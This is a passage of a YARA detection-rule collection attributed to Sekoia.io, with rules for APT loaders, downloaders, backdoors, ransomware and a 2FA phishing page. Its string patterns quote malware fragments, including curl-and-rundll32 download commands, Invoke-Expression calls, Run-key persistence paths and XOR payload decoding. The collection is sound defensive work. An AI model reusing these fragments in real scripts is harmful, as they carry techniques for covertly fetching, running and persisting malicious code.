		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/storm_1811_files_dat.yar#L1-L24"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "d1d5b76671cefe8b876ca8df50205a04ebbcd973f115919b901f6a7946492904"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = "RuntimeBroker" ascii fullword
		$s2 = "InstallSpamFilters" ascii fullword
		$s3 = "newfile333.txt" ascii fullword
		$s4 = "Installing spam filter kb_outlook" ascii fullword
		$s5 = "s.zip" ascii fullword
		$s6 = "Update completed" ascii fullword
		$s7 = "Updates installed" ascii fullword
		$s8 = "update_log.tgz uploaded ok" ascii fullword
		$s9 = "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" ascii fullword
		$s10 = "runtimebroker_connect" ascii fullword

	condition:
		5 of them
}

rule SEKOIA_Loader_Win_Operationmagalenha_Vbs_1
{
	meta:
		description = "Finds VBS file loading the PeepingTitle backdoor"
		author = "Sekoia.io"
		id = "b1f705d1-de3e-4ce6-9bb7-0e39b6e79add"
		date = "2023-05-31"
		modified = "2024-12-19"
		reference = "https://www.sentinelone.com/labs/operation-magalenha-long-running-campaign-pursues-portuguese-credentials-and-pii/"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/loader_win_operationmagalenha_vbs.yar#L1-L39"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "bb1c48ea6a4d9f0bc04df558837f2d448b38eac920cb4030e01b915a4e442708"
		score = 75
		quality = 78
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$str01 = "'Skip to content" ascii
		$str02 = "'Search" ascii
		$str03 = "'Sign in" ascii
		$str04 = "'Sign up" ascii
		$str05 = "'Code" ascii
		$str06 = "'Terms" ascii
		$str07 = "'Privacy" ascii
		$str08 = "'Security" ascii
		$str09 = "'Status" ascii
		$str10 = "'Docs" ascii
		$str11 = "'Contact GitHub" ascii
		$str12 = "'Pricing" ascii
		$str13 = "'API" ascii
		$str14 = "'Training" ascii
		$str15 = "'Blog" ascii
		$str16 = "'About" ascii
		$vbs01 = "WScript.Sleep" ascii nocase
		$vbs02 = "Set obj" ascii nocase
		$vbs03 = "Dim obj" ascii nocase
		$vbs04 = "https://tinyurl.com" ascii nocase
		$vbs05 = "C:\\Users\\Public" ascii nocase
		$vbs06 = "CreateObject(\"WScript.Shell\")" ascii nocase
		$vbs07 = ".SaveToFile" ascii nocase

	condition:
		10 of ( $str* ) and 5 of ( $vbs* )
}

rule SEKOIA_Apt_Apt29_Wineloader_Malicious_Hta_1
{
	meta:
		description = "Detects malicious HTA used by APT29 to drop Wineloader"
		author = "Sekoia.io"
		id = "5a17d854-0564-4830-a0e5-7867b99716c2"
		date = "2024-03-25"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_apt29_wineloader_malicious_hta.yar#L1-L18"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		hash = "efafcd00b9157b4146506bd381326f39"
		logic_hash = "0cc4692e5ff3f258c287f28030147f725d6a534c4f2f7a2a4ff49a305b7fd13d"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "<HTA:APPLICATION ID="
		$ = "var _0x"
		$ = "Date['\\x6e\\x6f\\x77']"

	condition:
		all of them
}

rule SEKOIA_Apt_Buhtrap_Maldocx_1
{
	meta:
		description = "Detect the malicious DOCX used by Buhtrap"
		author = "Sekoia.io"
		id = "4aaba2f1-fafd-4e3f-8b18-7beda11464d1"
		date = "2022-02-25"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_buhtrap_maldocx.yar#L1-L25"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "69968fa6836a71cd835f40c5168d197d3b5fc13b62791279f48a6bdeb4709bd5"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "<xm:macrosheet xmlns=" ascii fullword
		$ = "CALL(\"kernel32\",\"VirtualFree"
		$ = "CALL(\"kernel32\",\"CreateFileA"
		$ = "CALL(\"kernel32\",\"WriteFile"
		$ = "CALL(\"kernel32\",\"VirtualAlloc"
		$ = "CALL(\"kernel32\",\"WinExec"
		$ = "CALL(\"kernel32\",\"lstrcatA"
		$ = "CALL(\"kernel32\",\"CreateFileA"
		$ = "CALL(\"kernel32\",\"VirtualFree"
		$ = "CALL(\"kernel32\",\"ExpandEnvironmentStringsA"
		$ = "CALL(\"kernel32\",\"CloseHandle"

	condition:
		all of them
}

rule SEKOIA_Vpn_Mul_Softether_1
{
	meta:
		description = "Detect the open-source SoftEther VPN"
		author = "Sekoia.io"
		id = "a1fbf4fe-b934-4a66-b6b1-ebe2f83505cd"
		date = "2024-04-15"
		modified = "2024-12-19"
		reference = "https://www.softether.org/"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/vpn_mul_softether.yar#L1-L29"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "f93e838631518590e518f29557c60a40734da30b62c056f8ebb8febed389551b"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\softether_se%s"
		$ = "GET /vgc_download_dat/ HTTP/1.1"
		$ = "http://x%c.x%c.client.api.vpngate2.jp/api/"
		$ = "http://x0.x0.client.api.vpngate2.jp/check/check.txt"
		$ = "https://x%c.x%c.statistics.api.vpngate2.jp/api/statistics/"
		$ = "Software\\SoftEther Project\\SoftEther VPN\\"
		$ = "|vpnsetup_nosign.exe" wide
		$ = "/ISEASYINSTALLER:%u" wide
		$ = "/CALLERSFXPATH:\"%s\"" wide
		$ = "vpn_client.config" wide
		$ = "vpn_bridge.config" wide
		$ = "|backup_dir_readme.txt" wide
		$ = "vpn_debuginfo_%04u%02u%02u_%02u%02u%02u.zip" wide

	condition:
		8 of them
}

rule SEKOIA_Rat_Win_Reverserat_1
{
	meta:
		description = "Detect SideCopy's ReverseRAT v3 observed in January 2023"
		author = "Sekoia.io"
		id = "8fbd395f-f44e-46d5-a942-7c7e88f37127"
		date = "2023-02-22"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/rat_win_reverserat.yar#L1-L19"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		hash = "b277a824b2671f40298ce03586a2ccc0fca2a081a66230c57a3060c2028f13ee"
		hash = "8b87459483248d7b95424cd52b7d4f3031e89c6644adc2e167556e071d9ec3aa"
		logic_hash = "13a5a916e084996ce4d7840581250f7630652acdcad0f66e21763cb3a9cbccc3"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "SELECT maxclockspeed,  datawidth, name, manufacturer FROM Win32_Processor" wide
		$ = "select * from Win32_PhysicalMemory" wide
		$ = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall" wide

	condition:
		all of them
}

rule SEKOIA_Apt_Lazarus_Blindingcan_Rtti_1
{
	meta:
		description = "Detects BLINDINGCAN with RTTI"
		author = "Sekoia.io"
		id = "9a16c189-ffc1-4aa6-8582-298abaecd0ef"
		date = "2022-10-04"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_lazarus_blindingcan_rtti.yar#L1-L16"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "fbec1f9a180782bf330d86facbada9af018741897c58f4ab6e0b52a1b38ae966"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = ".?AVCHTTP_Protocol@@" ascii wide fullword
		$s2 = ".?AVCFileRW@@" ascii wide fullword

	condition:
		all of them
}

rule SEKOIA_Apt_Muddywater_Powershell_Reverse_Secure_Proxy_1
{
	meta:
		description = "Detects PowerShell Reverse Secure Proxy"
		author = "Sekoia.io"
		id = "b255f327-cb56-41b7-82f7-83ee23f791a5"
		date = "2023-11-14"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_muddywater_powershell_reverse_secure_proxy.yar#L1-L17"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "6507bc030d60af5559492bbb02bc619646306ab06c9bd9d3f78ae6ce55307bda"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "$CS.Read($buff,4,2) | Out-Null" ascii wide
		$ = "$DP = $buff[2]*256 + $buff[3]" ascii wide
		$ = "$PS3.BeginInvoke() | Out-Null" ascii wide

	condition:
		all of them
}

rule SEKOIA_Apt_Susp_Apt28_Uac0063_Hta_Loader_1
{
	meta:
		description = "Detects some suspected APT28 HTA loader"
		author = "Sekoia.io"
		id = "8e1889c1-c6ac-4048-9d3a-99ccbbd5435f"
		date = "2024-07-25"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_susp_apt28_uac0063_hta_loader.yar#L1-L18"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		hash = "332d9db35daa83c5ad226b9bf50e992713bc6a69c9ecd52a1223b81e992bc725"
		logic_hash = "494331a8088d350e4e49e67fe64041d451886e501775413f908bd9b3faa98aeb"
		score = 65
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "<HEAD><HTA:APPLICATION ID" ascii fullword
		$ = "id=service>null</span" ascii fullword
		$ = "script Language=\"VBScript.Encode" ascii fullword

	condition:
		2 of them
}

rule SEKOIA_Downloader_Win_Curl_Agent_1
{
	meta:
		description = "Detect the downloader used by Bluenoroff to install it CurlAgent"
		author = "Sekoia.io"
		id = "ddeb2d8f-1b10-4a33-b768-d19412e8551a"
		date = "2023-05-02"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/downloader_win_curl_agent.yar#L1-L19"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "b34375ec051c969adec82901c1130b0a389261912559d70c652ee826cb2d4107"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "%s\\marcoor.dll" wide
		$ = "curl -A cur1-agent -L %s -s -d dl"
		$ = "curl -A cur1-agent -L %s -s -d da"
		$ = "cmd /c timeout /t 10 & rundll32 \"%s\" #1" wide
		$ = "cmd /c timeout /t 10 & Del /f /q \"%s\" & attrib -s -h \"%s\" & rundll32 \"%s\" #1" wide

	condition:
		3 of them
}

rule SEKOIA_Apt_Polonium_Powershell_Creepydrive_Strings_1
{
	meta:
		description = "Detects POLONIUM CreepyDrive Powershell implant"
		author = "Sekoia.io"
		id = "0ba196bd-9cd6-4553-b7bf-69989cdb8be4"
		date = "2022-06-03"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_polonium_powershell_creepydrive_strings.yar#L1-L24"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "28b8f10a36d13e97e606b082f20c50c3d48241409e7f1aca621e2af9d756dbe5"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "function Exec($comm)" base64 ascii wide
		$ = "$comm = $comm + \"| outstring" base64 ascii wide
		$ = "Invoke-Expression -Command:$comm" base64 ascii wide
		$ = "microsoft.com" base64 ascii wide
		$ = "$req = Invoke-WebRequest" base64 ascii wide
		$ = "$j += $data" base64 ascii wide
		$ = "$res = Exec($arr[$i])" base64 ascii wide
		$ = "$arr = @(iex \"$req\")" base64 ascii wide
		$ = "elseif ($req -cmatch" base64 ascii wide
		$ = "graph.microsoft.com" base64 ascii wide

	condition:
		3 of them
}

rule SEKOIA_Tool_Pivotnacci_1
{
	meta:
		description = "Detects Pivotnacci"
		author = "Sekoia.io"
		id = "31ecb08a-fc92-4cbe-a865-7ce869a5fa6a"
		date = "2024-04-22"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/tool_pivotnacci.yar#L1-L21"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "b0e4bc997775fb5ff258a23e07a58b4897a2ce9d3fffab86e93919857e566d18"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$pivotnacci = "pivotnacci"
		$s1 = "Socks server => %s:%s"
		$s2 = "The default listening address"
		$s3 = "Socks server for HTTP agents"
		$s4 = "Message returned by the agent web page"
		$s5 = "Password to communicate with the agent"
		$s6 = "To specify agent type in case is not automatically detected."

	condition:
		$pivotnacci and 3 of ( $s* )
}

rule SEKOIA_Backdoor_Oyster_1
{
	meta:
		description = "Detects files related to the Oyster backdoor."
		author = "Sekoia.io"
		id = "f95f98ea-1e52-45ae-8abf-a986f95d4ab2"
		date = "2024-08-29"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/backdoor_oyster.yar#L1-L16"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "ffd84d0c7064bcd69121aa606bc642ff2b5c9927ba622260a02a9689c7ab8878"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = "CleanUp30.dll" ascii fullword
		$s2 = "MSTeamsSetup_c_l_.exe" ascii fullword

	condition:
		all of them
}

rule SEKOIA_Latrodectus_Br4_Js_Dropper_1
{
	meta:
		description = "Detect the JS script used to drop Latrodectus"
		author = "Sekoia.io"
		id = "042a598d-66fa-4994-a793-228355abd5dd"
		date = "2024-06-25"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/latrodectus_br4_js_dropper.yar#L1-L16"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "a835bd9a9ad68fd2f285ec5c04a5c78ba5ca85381ff30048ac375bef220fd72f"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = " installer.InstallProduct(msiPath);" ascii
		$s2 = "new ActiveXObject(\"WindowsInstaller.Installer\");" ascii

	condition:
		all of them
}

rule SEKOIA_Downloader_Kimsuky_Lnk_1
{
	meta:
		description = "Detect Kimsuky LNK"
		author = "Sekoia.io"
		id = "3831d115-7874-4bc9-aeb4-d2cb9bc2b5c9"
		date = "2024-07-16"
		modified = "2024-12-19"
		reference = "https://blogs.jpcert.or.jp/en/2024/07/attack-activities-by-kimsuky-targeting-japanese-organizations.html"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/downloader_kimsuky_lnk.yar#L1-L22"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "3512c8c21203a015b316c2a993db1a8c10420df06ea97d84a6e350550a628230"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"
		hash1 = "3065b8e4bb91b4229d1cea671e8959da8be2e7482067e1dd03519c882738045e"
		hash2 = "d912f49d24792aa7197509f76e2097ac3858cde23199e1b40f2516948d39c589"
		hash3 = "e936445935c4a636614f7113e4121695a5f3e4a6c137b7cdcceb6f629aa957c4"
		hash4 = "fe156159a26f8b7c140db61dd8b136e1c8103a800748fe9b70a3a3fdf179d3c3"

	strings:
		$ = "AType: Text Document" wide
		$ = "Size: 5.23 KB" wide
		$ = "Date modified: 01/02/2020 11:23" wide

	condition:
		all of them
}

rule SEKOIA_Koi_Powershell_Loading_Obfuscatednet_1
{
	meta:
		description = "Powershell script loading obfuscated .NET Koi module"
		author = "Sekoia.io"
		id = "75a7460d-cc28-470e-9841-da8e46ee0101"
		date = "2024-03-20"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/koi_powershell_loading_obfuscatednet.yar#L1-L18"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "82f30c04474ea77af5169771a2c0e75ba792fd32dc559b8c29172b73ace4ef10"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = "# [Net.ServicePointManager]::SecurityProtocol +='tls12'"
		$s2 = "$binary[$i] = $binary[$i] -bxor $k[$i % $k.Length]"
		$s3 = "\").Split('|')"
		$s4 = "$ep.Invoke($null, "

	condition:
		$s3 and 3 of them
}

rule SEKOIA_Ransomware_Win_Shrinklocker_1
{
	meta:
		description = "Detects files related to the ShrinkLocker ransomware"
		author = "Sekoia.io"
		id = "93a6fbdd-ad62-456a-a1a5-b5ae3b242004"
		date = "2024-06-07"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/ransomware_win_shrinklocker.yar#L1-L25"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "7770b0946b9bb482f23c4ce0d753393e0d42a6fd8b31029847d74356296f0cf1"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$a = "shrinkdisk" ascii fullword
		$b = "BitLocker" ascii fullword
		$c = "diskpart" ascii fullword
		$d = "disk.vbs" ascii fullword
		$e = "strDriveLetter" ascii fullword
		$f = "shrinkcomplate" ascii fullword
		$g = "ADODB.Stream" ascii fullword
		$h = "Win32_OperatingSystem" ascii fullword
		$i = "HKLM\\System\\CurrentControlSet\\Control\\Terminal Server" ascii fullword
		$j = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" ascii fullword
		$k = "HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE" ascii fullword

	condition:
		9 of them
}

rule SEKOIA_Apt_Reaper_2Fa_Phishing_Webpage_1
{
	meta:
		description = "Detects Reaper 2FA phishing webpage"
		author = "Sekoia.io"
		id = "348ca2ad-c8f9-4aed-8a27-95caa3a34f4b"
		date = "2023-03-09"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_reaper_2fa_phishing_webpage.yar#L1-L23"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "3f0ae0b35ea181b4712feeb34e866519921917179297148982e5298df9f133a9"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "setTimeout(checkUpload,"
		$ = "commChannel.addListener("
		$ = "else if(commType =="
		$ = "?dir=DOWN&method=READ&id="
		$ = "Content : base64_encode(upload_data)"
		$ = "$.post(upHttpRelayer"
		$ = "var ablyUpData = {"
		$ = "initComm();"
		$ = "function Next(arg) {"

	condition:
		3 of them
}

rule SEKOIA_Apt_Unc4990_Explorer_Ps1_1
{
	meta:
		description = "Detects powershell script (explorer.ps1)"
		author = "Sekoia.io"
		id = "2e1abbbf-f9b7-4147-b7da-3544cbc4a5f1"
		date = "2024-02-01"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_unc4990_explorer_ps1.yar#L1-L19"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "5085f738e23b801c7e36408d189755086d91c0bb266af6738c80510eb85e598f"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s0 = "$(get-location).Path"
		$s1 = "+ \"\\Runtime Broker.exe"
		$s2 = "Start-Process -FilePath"
		$s3 = "-Wait;"
		$s4 = "Start-Sleep -s"

	condition:
		all of them and @s3- @s2 < 35
}

rule SEKOIA_Apt_Apt37_Chinotto_Powershell_Variant_1
{
	meta:
		description = "Detects APT37 Chinotto Powershell Variant"
		author = "Sekoia.io"
		id = "fa42b225-58fe-4e00-b84b-df37491d8fdd"
		date = "2023-03-06"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_apt37_chinotto_powershell_variant.yar#L1-L20"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "b4d17467f15d52bd615e335fa8bc31381ec273b67dabb74655f47179f04f631f"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "$env:COMPUTERNAME + '-' + $env:USERNAME;" ascii wide
		$ = "while($true -eq $true)" ascii wide
		$ = "Start-Sleep -Seconds" ascii wide
		$ = " -ne 'null' -and $" ascii wide
		$ = "= 'R=' + [System.Convert]::" ascii wide
		$ = "[string]$([char]0x0D) + [string]$([char]0x0A);" ascii wide

	condition:
		4 of them
}

rule SEKOIA_Ransomware_Win_Raworld_1
{
	meta:
		description = "Detects files related to stage 1 of a campaign from the ransomware group RA World."
		author = "Sekoia.io"
		id = "a9ed9c5a-7a0e-4c2e-90f4-d52f5589b2b8"
		date = "2024-07-24"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/ransomware_win_raworld.yar#L1-L23"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "583dd2ea8e20a87d0b67783d1dd59212eb133de1f945d5b4afad89e8a5017d35"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = "Loder.exe" ascii fullword
		$s2 = "Stage2.exe" wide
		$s3 = "SYSVOL" wide
		$s4 = "Finish.exe" wide
		$s5 = "Exclude.exe" wide
		$s6 = "Stage3.exe" wide
		$s7 = "Pay.txt" ascii fullword
		$s8 = "RA World" ascii fullword
		$s9 = "Stage1.exe" ascii fullword

	condition:
		4 of them
}

rule SEKOIA_Keylogger_Win_Donot_1
{
	meta:
		description = "Detect the DoNot's keylogger malware"
		author = "Sekoia.io"
		id = "4f67dda7-da68-4496-a8b4-a8a769ddd763"
		date = "2023-03-20"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/keylogger_win_donot.yar#L1-L16"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "eb935f84335e934346511b4108f70df469deef6ecaaba809c144197c04a28f64"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "iwrct2mTFAu0ew1nyqQgoaNtNo0+52R0XiTKbwy1W48Bn1b2YcNt0+tptyY6oGoAeLDGekM/yHcdikNGi8bLqkUQ8CIdkWeT3QiympOTfjs="
		$ = "ZmVwZW9kbWZ2c24ucHMuZ3h4LngweXBvdWpkYm1qcXE7YnFmVXp1LmZvb3VEcA=="

	condition:
		1 of them
}

rule SEKOIA_Apt_Kimsuky_Sharptongue_C2_Source_1
{
	meta:
		description = "Detects the PHP code of the SharpTongue C2"
		author = "Sekoia.io"
		id = "a2ccf773-511c-4088-8bcf-b923291d024b"
		date = "2022-07-29"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_kimsuky_sharptongue_c2_source.yar#L1-L18"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "c301a99876cfe2863546c990654aa922f9327e0eb010968eaea43f1d8ced76da"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "<?php"
		$ = "foreach($_GET as $variable => $value)"
		$ = "$chk=$value"
		$ = "base64_encode($ip)"

	condition:
		all of them
}

rule SEKOIA_Tool_Xiebroc2_Strings_1
{
	meta:
		description = "Detects XiebroC2 based on strings"
		author = "Sekoia.io"
		id = "8451878e-5371-440b-b8ac-f9e6f7643d3c"
		date = "2024-09-11"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/tool_xiebroc2_strings.yar#L1-L40"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		hash = "84e665bcbf963a2cf67d879aa3422d79"
		hash = "3558c376420724694ba244a2e2acd20c"
		hash = "e29fb9cd825db51a7a2e519f188e61ba"
		hash = "a3b31739ad5eed51277c8478a83160a3"
		hash = "d6e2499ea7fe8f047da1a95dae16d2c3"
		hash = "1616818b65bf49d985bb1816461a4a75"
		hash = "2e72d3ef2492088a4623d77d5e419ab8"
		hash = "351770f860507d652ec3644ed1988f7f"
		hash = "58fa6ad96028753ba8b0b0ed8fa6dccb"
		hash = "607b541525b27eeefbef1455397bff35"
		hash = "c2a242612468814e2e951e4db3762059"
		hash = "431e275f4e43ec4ef7c2cc8ba126e9d3"
		hash = "ace54bd32c226a7b9a6d4d53791e4021"
		hash = "f22c21ed7bba1ddfc42ffdc66da3a4dd"
		hash = "9a5ff9e07ed04cb0e71102cf1aae380c"
		hash = "d20e01a1af3f40a7a9646d7e7df1b42e"
		hash = "5544b621c9772cd32c4db77a0e59515a"
		logic_hash = "f3be31e0f1ad8e8bce132d861de5068340653547d786378f9b8045382f40939f"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = "RemarkClientColor"
		$s2 = "HandlePacket"
		$s3 = "-hide"
		$s4 = "Failed to send data:"
		$s5 = "Pac_ket"
		$s6 = "WANip"
		$s7 = "%s %s && Kernel: %s"
		$g1 = "go.buildid"
		$g2 = "dep    golang.org"

	condition:
		3 of ( $s* ) and any of ( $g* )
}

rule SEKOIA_Spyware_And_Bahamut_1
{
	meta:
		description = "Detect Bahamut's spyware based on common information gathering function names"
		author = "Sekoia.io"
		id = "d416997e-baf1-412c-bf39-905a6e19b65e"
		date = "2022-11-23"
		modified = "2024-12-19"
